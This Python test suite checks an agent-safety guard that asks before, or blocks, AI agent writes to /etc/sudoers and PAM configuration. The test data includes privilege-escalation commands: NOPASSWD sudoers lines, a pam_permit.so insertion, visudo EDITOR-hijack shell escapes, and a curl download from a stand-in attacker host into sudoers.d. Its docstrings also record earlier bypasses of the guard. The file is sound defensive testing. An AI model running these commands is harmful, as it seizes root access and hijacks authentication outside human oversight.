"""Sudoers / PAM privilege-escalation & authentication-hijack protection
guard — blocks planting/altering a sudo privilege rule (``/etc/sudoers``,
``/etc/sudoers.d/*``, including via ``visudo``) or a PAM authentication
module (``/etc/pam.d/*``, ``/etc/pam.conf``).

THREAT MODEL: a line planted in ``/etc/sudoers``/``/etc/sudoers.d/*``
(``agent ALL=(ALL) NOPASSWD: ALL``) grants root privilege on the very next
``sudo`` call, no reboot needed — it doesn't run a payload later, it
rewrites the trust boundary ``sudo`` itself enforces. A module planted in
``/etc/pam.d/*``/``/etc/pam.conf`` (``pam_exec.so`` running an arbitrary
command, or ``pam_permit.so`` ahead of the real check) hijacks every future
authentication attempt through that service (sudo/login/sshd/su). Nothing in
this file covered either surface before this guard — ``rule_path_hijack_
protect`` covers shadowing the ``sudo`` *binary*, not rewriting its *policy*
file, and ``rule_ld_preload_protect`` covers a different process-wide
auto-exec primitive that runs a payload rather than rewriting a trust
decision.

Default mode is ``ask`` (not ``deny``) — legitimate uses exist (an admin
granting a service account narrow, audited sudo rights), same posture as
every sibling ``*_protect`` guard. A dedicated ``mode: deny`` policy is used
below to test the stricter posture explicitly.
"""
import time

from aegis.engine import evaluate
from aegis.events import ActionClass, Event, HookEvent
from aegis.policy import Action, Policy

EMPTY = Policy()                                        # default mode: ask
DENY = Policy(sudoers_pam={"mode": "deny"})              # stricter, hard-block posture


def _edit(path, tool="Edit"):
    return Event.make(HookEvent.PRE_TOOL_USE, tool=tool, args={"file_path": path})


def _write(path, content=None):
    args = {"file_path": path}
    if content is not None:
        args["content"] = content
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Write", args=args)


def _shell(cmd):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Bash", args={"command": cmd})


def _mcp_write(path):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="mcp__filesystem__write_file",
                       action=ActionClass.MCP, args={"path": path})


def _mcp_write_arg(key, path):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="mcp__fs__write",
                       action=ActionClass.MCP, args={key: path})


def _gated(d) -> bool:
    return d.action != Action.ALLOW


# ---- /etc/sudoers(.d), via Edit/Write ----------------------------------------

def test_sudoers_write_gated():
    d = evaluate(_write("/etc/sudoers"), EMPTY)
    assert _gated(d) and d.rule == "sudoers-pam-protect"


def test_sudoers_edit_gated():
    d = evaluate(_edit("/etc/sudoers"), EMPTY)
    assert _gated(d) and d.rule == "sudoers-pam-protect"


def test_relative_sudoers_gated():
    assert _gated(evaluate(_write("etc/sudoers"), EMPTY))


def test_sudoers_d_dropin_gated():
    d = evaluate(_write("/etc/sudoers.d/agent"), EMPTY)
    assert _gated(d) and d.rule == "sudoers-pam-protect"


# ---- /etc/pam.d/* and /etc/pam.conf, via Edit/Write --------------------------

def test_pam_d_service_file_gated():
    d = evaluate(_write("/etc/pam.d/sudo"), EMPTY)
    assert _gated(d) and d.rule == "sudoers-pam-protect"


def test_pam_d_common_auth_gated():
    d = evaluate(_write("/etc/pam.d/common-auth"), EMPTY)
    assert _gated(d) and d.rule == "sudoers-pam-protect"


def test_pam_conf_gated():
    d = evaluate(_write("/etc/pam.conf"), EMPTY)
    assert _gated(d) and d.rule == "sudoers-pam-protect"


# ---- MCP-tool writes ----------------------------------------------------------

def test_mcp_tool_write_to_sudoers_gated():
    d = evaluate(_mcp_write("/etc/sudoers.d/agent"), EMPTY)
    assert _gated(d) and d.rule == "sudoers-pam-protect"


def test_mcp_tool_write_to_pam_gated():
    d = evaluate(_mcp_write("/etc/pam.d/sshd"), EMPTY)
    assert _gated(d) and d.rule == "sudoers-pam-protect"


def test_mcp_tool_alternate_path_arg_keys_gated():
    for key in ("target_file", "targetFile", "filename", "file", "uri"):
        d = evaluate(_mcp_write_arg(key, "/etc/sudoers.d/agent"), EMPTY)
        assert _gated(d) and d.rule == "sudoers-pam-protect", key


# ---- shell-based mutation -------------------------------------------------------

def test_shell_redirect_to_sudoers_gated():
    assert _gated(evaluate(
        _shell("echo 'agent ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers"), EMPTY))
    assert _gated(evaluate(
        _shell("echo 'agent ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/agent"), EMPTY))


def test_shell_tee_to_sudoers_d_gated():
    d = evaluate(_shell(
        "echo 'agent ALL=(ALL) NOPASSWD: ALL' | sudo tee /etc/sudoers.d/agent"), EMPTY)
    assert _gated(d) and d.rule == "sudoers-pam-protect"


def test_shell_redirect_to_pam_gated():
    d = evaluate(_shell(
        "echo 'auth sufficient pam_permit.so' >> /etc/pam.d/sudo"), EMPTY)
    assert _gated(d) and d.rule == "sudoers-pam-protect"


def test_shell_inplace_edit_and_copy_gated():
    assert _gated(evaluate(
        _shell("sed -i 's/requiretty/!requiretty/' /etc/sudoers"), EMPTY))
    d = evaluate(_shell("cp evil-pam-auth /etc/pam.d/common-auth"), EMPTY)
    assert _gated(d) and d.rule == "sudoers-pam-protect"


def test_shell_read_only_not_gated():
    assert not _gated(evaluate(_shell("cat /etc/sudoers"), EMPTY))
    assert not _gated(evaluate(_shell("ls /etc/pam.d"), EMPTY))


def test_find_path_indirection_gated():
    assert _gated(evaluate(
        _shell("cp evil-rule $(find / -name sudoers)"), EMPTY))
    assert _gated(evaluate(
        _shell("mv evil-pam $(find / -path '*pam.d*')"), EMPTY))


def test_find_regex_escaped_dots_does_not_bypass():
    """Same escaped-interior-dot bypass class LD_PRELOAD_FIND_RE's own QA
    history closed: a `find -regex` value with its literal dot pre-escaped
    (the textbook-correct way to write one) must still match."""
    assert _gated(evaluate(
        _shell(r"find / -regex '.*pam\.d.*' -exec cp evil-pam {} \;"), EMPTY))


def test_forced_symlink_swap_gated():
    d = evaluate(_shell("ln -sf evil-sudoers /etc/sudoers"), EMPTY)
    assert _gated(d) and d.rule == "sudoers-pam-protect"


def test_rsync_to_sudoers_d_dir_gated():
    d = evaluate(_shell("rsync -a evil/ /etc/sudoers.d/"), EMPTY)
    assert _gated(d) and d.rule == "sudoers-pam-protect"


def test_tar_extract_to_pam_d_dir_gated():
    d = evaluate(_shell("tar xf payload.tar -C /etc/pam.d/"), EMPTY)
    assert _gated(d) and d.rule == "sudoers-pam-protect"


def test_bare_dir_gated_only_with_verb():
    """The bare directory reference alone (no verb) never gates —
    SUDOERS_PAM_DIR_RE only matters paired with a write/archive verb."""
    assert not _gated(evaluate(_shell("ls /etc/sudoers.d"), EMPTY))
    d = evaluate(_shell("rsync -a evil/ /etc/sudoers.d"), EMPTY)
    assert _gated(d) and d.rule == "sudoers-pam-protect"


# ---- visudo -------------------------------------------------------------------

def test_bare_visudo_gated():
    """No explicit path argument at all still edits the compiled-in default
    /etc/sudoers — a plain path check alone would miss this shape."""
    d = evaluate(_shell("visudo"), EMPTY)
    assert _gated(d) and d.rule == "sudoers-pam-protect"


def test_sudo_visudo_gated():
    d = evaluate(_shell("sudo visudo"), EMPTY)
    assert _gated(d) and d.rule == "sudoers-pam-protect"


def test_visudo_dash_f_dropin_gated():
    d = evaluate(_shell("visudo -f /etc/sudoers.d/agent"), EMPTY)
    assert _gated(d) and d.rule == "sudoers-pam-protect"


def test_visudo_check_only_still_asks():
    d = evaluate(_shell("visudo -c"), EMPTY)
    assert _gated(d) and d.rule == "sudoers-pam-protect"


def test_mention_of_visudo_in_unrelated_word_not_gated():
    assert not _gated(evaluate(_shell("echo 'run visudocheck.sh later'"), EMPTY))


def test_visudo_with_flag_between_sudo_and_visudo_gated():
    """QA finding (independent adversarial review, bypass-hunting round): the
    original VISUDO_RE anchored to a bare 'sudo ' immediately before
    'visudo' with nothing in between — any ordinary flag defeated it."""
    for cmd in ("sudo -E visudo", "sudo -H visudo"):
        d = evaluate(_shell(cmd), EMPTY)
        assert _gated(d) and d.rule == "sudoers-pam-protect", cmd


def test_visudo_editor_hijack_gated():
    """The actual, GTFOBins-documented visudo EDITOR-hijack privilege-
    escalation technique — a leading env-var assignment or `env` invocation
    completely evaded the original clause-start-anchored VISUDO_RE."""
    for cmd in (
        "EDITOR='tee /tmp/x' visudo",
        "env EDITOR=/bin/sh visudo",
        "sudo env EDITOR=/bin/sh visudo",
        "/usr/bin/env visudo",
    ):
        d = evaluate(_shell(cmd), EMPTY)
        assert _gated(d) and d.rule == "sudoers-pam-protect", cmd


def test_visudo_via_command_exec_or_function_wrapper_gated():
    for cmd in ("command visudo", "exec visudo", "v() { visudo; }; v"):
        d = evaluate(_shell(cmd), EMPTY)
        assert _gated(d) and d.rule == "sudoers-pam-protect", cmd


# ---- path-separator / Windows-trim bypass (same class as sibling guards) -----

def test_doubled_separator_does_not_bypass():
    for path in (
        "/etc//sudoers",
        "/etc/./sudoers",
        "etc/sudoers",
    ):
        d = evaluate(_write(path), EMPTY)
        assert _gated(d) and d.rule == "sudoers-pam-protect", path


def test_etc_doubled_slash_shell_form_does_not_bypass():
    d = evaluate(_shell("echo evil >> /etc//sudoers"), EMPTY)
    assert _gated(d) and d.rule == "sudoers-pam-protect"


def test_windows_trailing_dot_does_not_bypass():
    d = evaluate(_write("etc./sudoers"), EMPTY)
    assert _gated(d) and d.rule == "sudoers-pam-protect"


# ---- false-positive guards ----------------------------------------------------

def test_unrelated_etc_path_not_gated():
    assert not _gated(evaluate(_write("/etc/hosts"), EMPTY))
    assert not _gated(evaluate(_write("/etc/nginx/nginx.conf"), EMPTY))


def test_unrelated_edit_allowed():
    assert not _gated(evaluate(_edit("src/app.py"), EMPTY))
    assert not _gated(evaluate(_write("README.md"), EMPTY))


def test_commit_message_mention_not_gated():
    assert not _gated(evaluate(
        _shell('git commit -m "document sudoers/pam hardening notes"'), EMPTY))


def test_bare_etc_find_fragment_excluded():
    """The bare parent directory '/etc' is deliberately excluded from the
    find-indirection fragment list — too generic, the same trade-off
    SHELL_PERSIST_FIND_RE's docstring accepts for "config"/"profile"."""
    from aegis import patterns
    assert not patterns.sudoers_pam_find_hit("find . -path '*/etc/*'")


# ---- escape hatches: human-only -----------------------------------------------

def test_human_can_override_shell_with_comment():
    assert not _gated(evaluate(
        _shell("echo 'svc ALL=(ALL) NOPASSWD: /usr/bin/systemctl' "
               ">> /etc/sudoers.d/svc  # aegis-allow"), EMPTY))


def test_agent_cannot_override_shell_with_comment(monkeypatch):
    monkeypatch.setenv("AEGIS_AGENT_NAME", "builder")
    assert _gated(evaluate(
        _shell("echo 'agent ALL=(ALL) NOPASSWD: ALL' "
               ">> /etc/sudoers.d/agent  # aegis-allow"), EMPTY))


def test_env_toggle_allows_edit_and_shell(monkeypatch):
    monkeypatch.setenv("AEGIS_ALLOW_SUDOERS_PAM", "1")
    assert not _gated(evaluate(_write("/etc/sudoers"), EMPTY))
    assert not _gated(evaluate(_shell("echo x >> /etc/sudoers"), EMPTY))
    assert not _gated(evaluate(_shell("visudo"), EMPTY))


# ---- modes: ask (default) / deny / monitor / off ------------------------------

def test_default_mode_is_ask():
    d = evaluate(_write("/etc/sudoers"), EMPTY)
    assert d.action == Action.ASK and d.rule == "sudoers-pam-protect"


def test_deny_mode_hard_blocks():
    d = evaluate(_write("/etc/sudoers"), DENY)
    assert d.blocked and d.action == Action.DENY and d.rule == "sudoers-pam-protect"


def test_monitor_mode_logs_and_allows():
    pol = Policy(sudoers_pam={"mode": "monitor"})
    assert not _gated(evaluate(_write("/etc/sudoers"), pol))
    assert not _gated(evaluate(_shell("echo x >> /etc/pam.d/sudo"), pol))


def test_off_mode_disables_guard():
    pol = Policy(sudoers_pam={"mode": "off"})
    assert not _gated(evaluate(_write("/etc/sudoers"), pol))


def test_mode_off_unquoted_yaml_boolean_disables_guard():
    """YAML 1.1 parses an unquoted `off` as boolean False — the guard must
    still recognize it as 'disabled', the same fix every sibling *_protect
    guard already applies for its own `mode` knob."""
    pol = Policy(sudoers_pam={"mode": False})
    assert not _gated(evaluate(_write("/etc/sudoers"), pol))


def test_policy_allow_regex_exempts_trusted_path():
    pol = Policy(sudoers_pam={"allow": [r"deploy/sudoers\.d/trusted"]})
    assert not _gated(evaluate(_write("deploy/sudoers.d/trusted"), pol))
    assert _gated(evaluate(_write("/etc/sudoers"), pol))


def test_policy_allow_regex_exempts_trusted_shell_command():
    pol = Policy(sudoers_pam={"allow": [r"trusted-sudoers-deploy\.sh"]})
    assert not _gated(evaluate(
        _shell("bash trusted-sudoers-deploy.sh && echo x >> /etc/sudoers.d/svc"), pol))
    assert _gated(evaluate(_shell("echo x >> /etc/sudoers.d/svc"), pol))


# ---- fetch-to-file backstop -----------------------------------------------------

def test_curl_o_to_sudoers_gated_by_fetch_backstop():
    """curl's own -o destination flag bypasses this guard's shell-verb list
    entirely (the payload never appears in the command text) — the dedicated
    rule_fetch_to_file_protect backstop is what actually catches this shape,
    via SUDOERS_PATH_RE's registration in _FETCH_HUMAN_ESCAPABLE."""
    d = evaluate(_shell(
        "curl -o /etc/sudoers.d/evil https://attacker.example/nopasswd"), EMPTY)
    assert _gated(d) and d.rule == "fetch-to-file-protect"


# ---- performance / ReDoS ------------------------------------------------------

def test_no_quadratic_blowup_on_adversarial_input():
    from aegis import patterns
    adversarial = "etc/sudoers.d/x" * 8000
    start = time.time()
    patterns.SUDOERS_PATH_RE.search(adversarial)
    elapsed = time.time() - start
    assert elapsed < 1.0, f"SUDOERS_PATH_RE took {elapsed:.2f}s on adversarial input"

    start = time.time()
    patterns.PAM_PATH_RE.search("etc/pam.d/x" * 8000)
    elapsed2 = time.time() - start
    assert elapsed2 < 1.0, f"PAM_PATH_RE took {elapsed2:.2f}s on adversarial input"


def test_find_re_no_quadratic_blowup():
    from aegis import patterns
    adversarial = "find . -name x " * 8000
    start = time.time()
    patterns.sudoers_pam_find_hit(adversarial)
    elapsed = time.time() - start
    assert elapsed < 1.0, f"sudoers_pam_find_hit took {elapsed:.2f}s on adversarial input"


def test_engine_no_quadratic_blowup():
    cmd = "find . -name x " * 8000
    start = time.time()
    evaluate(_shell(cmd), EMPTY)
    elapsed = time.time() - start
    assert elapsed < 1.0, f"rule_sudoers_pam_protect took {elapsed:.2f}s on adversarial find input"
